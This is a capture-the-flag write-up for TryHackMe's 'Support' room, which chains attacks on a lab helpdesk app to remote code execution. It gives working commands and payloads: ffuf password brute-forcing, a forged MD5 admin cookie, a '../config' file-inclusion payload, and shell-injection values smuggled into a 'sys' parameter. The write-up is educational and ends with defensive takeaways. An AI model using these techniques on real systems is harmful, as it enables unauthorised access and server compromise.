# Support — CTF Writeup

> **Support Ops** is a helpdesk/ticket management platform. The goal is to pentest the application like a real attacker — mapping its structure, abusing exposed functionality, and chaining vulnerabilities to achieve Remote Code Execution (RCE).

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — Gobuster Directory Enumeration](#step-2--gobuster-directory-enumeration)
- [Step 3 — FFUF Password Brute-Force](#step-3--ffuf-password-brute-force)
- [Step 4 — Cookie Analysis & Hash Manipulation](#step-4--cookie-analysis--hash-manipulation)
- [Step 5 — Dashboard Access as Helpdesk User](#step-5--dashboard-access-as-helpdesk-user)
- [Step 6 — API Endpoint Leaks Admin Email](#step-6--api-endpoint-leaks-admin-email)
- [Step 7 — LFI via Skin Parameter → Config Exposed](#step-7--lfi-via-skin-parameter--config-exposed)
- [Step 8 — Admin Login & Flag 1](#step-8--admin-login--flag-1)
- [Step 9 — Command Injection via Date Parameter](#step-9--command-injection-via-date-parameter)
- [Step 10 — RCE → Final Flag](#step-10--rce--final-flag)
- [Flags Summary](#flags-summary)
- [Vulnerability Summary](#vulnerability-summary)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                               |
|-------------|-------------------------------------------------------|
| Name        | Support                                               |
| Platform    | TryHackMe                                             |
| Difficulty  | Medium                                                |
| Category    | Web — Auth Bypass + LFI + Command Injection (RCE)    |
| Target IP   | 10.48.181.231                                         |
| Objective   | Exploit the Support Ops platform to achieve RCE and capture both flags |

---

## Step 1 — Nmap Scan

Started with a full port scan to identify all open services and versions on the target.

**Command:**
```bash
nmap -sV -sC -p- -Pn -sS 10.48.181.231
```

**Scan Results:**

| Port   | State | Service | Version                                      |
|--------|-------|---------|----------------------------------------------|
| 22/tcp | open  | ssh     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.11            |
| 80/tcp | open  | http    | Apache httpd 2.4.58 (Ubuntu)                 |

**Additional Findings:**
```
http-title: Support Operations Panel
http-server-header: Apache/2.4.58 (Ubuntu)
http-cookie-flags:
    PHPSESSID:
        httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Key Observations:**
> - Port **80** is running a PHP app titled **"Support Operations Panel"**
> - `PHPSESSID` cookie is missing the `httponly` flag — a significant security misconfiguration
> - Only SSH and HTTP are exposed — the entire attack surface is web-based

---

## Step 2 — Gobuster Directory Enumeration

Ran Gobuster to discover hidden directories and PHP files on the web server.

**Command:**
```bash
gobuster dir -u http://10.48.181.231/ -w directory-list-2.3-medium.txt -x php
```

**Gobuster Configuration:**

| Option          | Value                          |
|-----------------|--------------------------------|
| URL             | http://10.48.181.231/          |
| Wordlist        | directory-list-2.3-medium.txt  |
| Extensions      | php                            |
| Threads         | 10                             |
| Negative Codes  | 404                            |

**Discovered Paths:**

| Path             | Status | Notes                         |
|------------------|--------|-------------------------------|
| /skins           | 301    | Theme/skin files directory    |
| /includes        | 301    | PHP include files             |
| /layout          | 301    | Layout/CSS files              |
| /js              | 301    | JavaScript files              |
| /server-status   | 403    | Forbidden — Apache status     |
| /config.php      | 200    | ⚠️ Config file accessible!    |

> **Key Finding:** `/config.php` is directly accessible — this will be important later alongside the `skin` parameter LFI.

---

## Step 3 — FFUF Password Brute-Force

The login page exposed the support email address `help@support.thm` directly on the page. Used **ffuf** to brute-force the password against the login form using the `rockyou.txt` wordlist.

**Command:**
```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -d "email=help@support.thm&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.48.181.231/ \
     -fs 2678
```

**ffuf Configuration:**

| Option     | Value                                        |
|------------|----------------------------------------------|
| Method     | POST                                         |
| Target     | http://10.48.181.231/                        |
| Wordlist   | /usr/share/wordlists/rockyou.txt             |
| Data       | email=help@support.thm&password=FUZZ         |
| Filter     | Response size 2678 (default/failed response) |
| Threads    | 40                                           |

**Result:**
```
snoopy    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
```

> 🔑 **Helpdesk Credentials Found:**
> - **Email:** `help@support.thm`
> - **Password:** `snoopy`

---

## Step 4 — Cookie Analysis & Hash Manipulation

After logging in as `help@support.thm`, inspected the browser's cookies using DevTools. Found the `PHPSESSID` cookie contained an MD5-based hash value.

**Cookie value found:**
```
68934a3e9455fa72420237eb05902327
```

Submitted this hash to **hashes.com** to crack it:

**Hash Lookup Result:**
```
68934a3e9455fa72420237eb05902327 : false
```

> The cookie stores an MD5 hash of the string `false` — meaning the current user is **not** marked as admin.

**Attack:** Generated the MD5 hash of the string `true` and replaced the cookie value:

```
MD5("true") = b326b5062b2f0e69046810717534cb09
```

Replaced the cookie in the browser with this new value to elevate privileges.

---

## Step 5 — Dashboard Access as Helpdesk User

After replacing the cookie with the MD5 hash of `true`, refreshed the page and gained access to the **Support Dashboard**.

**URL:**
```
http://10.48.181.231/dashboard.php
```

**Dashboard Contents:**
```
Welcome, Helpdesk User

Ticket management system

IT Admin Panel
[ View API ]
```

> Successfully authenticated. The dashboard revealed an **IT Admin Panel** with a **"View API"** button — pointing to an API endpoint worth exploring.

---

## Step 6 — API Endpoint Leaks Admin Email

Navigated to the `/user/1` API endpoint discovered via the "View API" link. The endpoint returned a JSON response leaking the admin account details.

**URL:**
```
http://10.48.181.231/user/1
```

**JSON Response:**
```json
{
  "email": "specialadmin@support.thm",
  "2FA":   false,
  "admin": true
}
```

> **Admin account details exposed:**
> - **Email:** `specialadmin@support.thm`
> - **2FA:** Disabled
> - **admin:** true
>
> This is the admin account we need to login as. Now we need the password.

---

## Step 7 — LFI via Skin Parameter → Config Exposed

From the Gobuster results, `/config.php` was found accessible and the `/skins` directory existed. The `dashboard.php` page accepts a `skin` parameter for theming — tested it for **Local File Inclusion (LFI)** using path traversal.

**Payload:**
```
http://10.48.181.231/dashboard.php?skin=../config
```

Viewed the **page source** of the response and found the PHP config file rendered inline:

**Source leaked from config.php:**
```php
<?php

$MASTER_PASSWORD = 'support@110';

$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

> 🔑 **Master Password found:** `support@110`
>
> **Note:** The `@` symbol caused issues during login — the actual working password is `support110` (without `@`). This appears to be a lab environment quirk.

---

## Step 8 — Admin Login & Flag 1

Logged into the portal using the admin credentials obtained from the API and config LFI.

| Field    | Value                      |
|----------|----------------------------|
| Email    | `specialadmin@support.thm` |
| Password | `support110`               |

Upon successful login, the admin dashboard displayed a confirmation banner with the **first flag**.

**Admin Dashboard Response:**
```
Administrator Access Confirmed
You have successfully authenticated as an administrator.

THM{I_AM_XXXXXXXX}
```

> 🚩 **Flag 1:** `THM{I_AM_XXXXXXXX}`
>
> Also noticed at the bottom of the admin dashboard: a **"Time"** widget displaying the current server time — a suspicious feature worth investigating further.

---

## Step 9 — Command Injection via Date Parameter

Inspected the "Time" widget at the bottom of the admin dashboard using **Browser DevTools → Network tab**. Intercepted the POST request and found it was sending a `sys` parameter to the server.

**Intercepted POST body:**
```
sys=date
```

**Hypothesis:** The server is directly passing this value to a system command (e.g., `shell_exec("date")`).

**Tested payload — appended a pipe to inject a second command:**
```
sys=date| ls
```

**Server Response (directory listing returned):**
```
api.php
config.php
dashboard.php
footer.php
includes
index.php
info.php
js
layout
logout.php
skins
```

> ✅ **Command Injection confirmed!** The `sys` parameter is passed unsanitised to the OS shell.  
> The server executed both `date` AND `ls` — full Remote Code Execution achieved.

---

## Step 10 — RCE → Final Flag

With command injection confirmed, used the `sys` parameter to read the final flag file from the server.

**Payload:**
```
sys=date| cat /home/ubuntu/user.txt
```

**Server Response:**
```
THM{I_AM_XXXXXXXX}
© 2026 Support Operations
Select Theme
    Default | Red | Green | Blue

Date ▼

THM{GOT_THE_XXXXXXX}
```

> 🚩 **Final Flag:** `THM{GOT_THE_XXXXXXX}`

---

## Flags Summary

| # | Flag                    | Method                                           | Location                    |
|---|-------------------------|--------------------------------------------------|-----------------------------|
| 1 | `THM{I_AM_XXXXXXXX}`    | Admin login via LFI config leak + API email dump | Admin dashboard banner      |
| 2 | `THM{GOT_THE_XXXXXXX}`  | RCE via command injection in `sys` parameter     | `/home/ubuntu/user.txt`     |

---

## Vulnerability Summary

| # | Vulnerability                    | Location                        | Impact                                       |
|---|----------------------------------|---------------------------------|----------------------------------------------|
| 1 | Email exposed on login page      | `index.php` (login page)        | Revealed username for brute-force            |
| 2 | Weak password                    | `help@support.thm` account      | Cracked with rockyou.txt (`snoopy`)          |
| 3 | Insecure cookie (MD5 of `false`) | `PHPSESSID` cookie              | Privilege escalation by forging `true` hash  |
| 4 | Unauthenticated API endpoint     | `/user/1`                       | Leaked admin email address                   |
| 5 | LFI via skin parameter           | `dashboard.php?skin=../config`  | Exposed `$MASTER_PASSWORD` in config.php     |
| 6 | Hardcoded password in config     | `config.php`                    | Admin password stored in plaintext           |
| 7 | OS Command Injection (RCE)       | `sys` POST parameter            | Full server compromise, arbitrary file read  |
| 8 | Missing `httponly` cookie flag   | `PHPSESSID`                     | Session cookie readable via JavaScript       |

---

## Attack Chain

```
Nmap → Port 80 (PHP app) → Gobuster → /config.php found
→ Login page leaks help@support.thm email
→ ffuf brute-force → password: snoopy
→ Login → inspect cookie → MD5("false") found
→ Forge MD5("true") → replace cookie → dashboard access
→ View API → /user/1 → admin: specialadmin@support.thm
→ LFI: dashboard.php?skin=../config → $MASTER_PASSWORD = support@110
→ Login as admin (support110) → Flag 1: THM{I_AM_XXXXXXXX}
→ Inspect "Time" widget → sys=date POST parameter
→ Inject: sys=date| ls → RCE confirmed
→ sys=date| cat /home/ubuntu/user.txt → Flag 2: THM{GOT_THE_XXXXXXXX}
```

---

## Key Takeaways

- **Never expose usernames/emails** on login pages — they make brute-force attacks trivial
- **MD5 is not a security mechanism** — using MD5 hashes of `true`/`false` as privilege cookies is critically broken
- **API endpoints must require authentication** — `/user/1` should not be publicly accessible
- **LFI in theming/skin parameters** is a common and dangerous misconfiguration
- **Never hardcode passwords** in PHP config files — use environment variables
- **User input must never reach `shell_exec`, `system`, or `exec`** without strict sanitisation — the `sys` parameter was a direct pipeline to the OS shell
- Always test **every user-controlled input** that appears to interact with server-side logic — the innocent-looking "Time" widget was the path to full RCE

---

*Writeup by: [showrya] | Platform: TryHackMe | Room: Support*
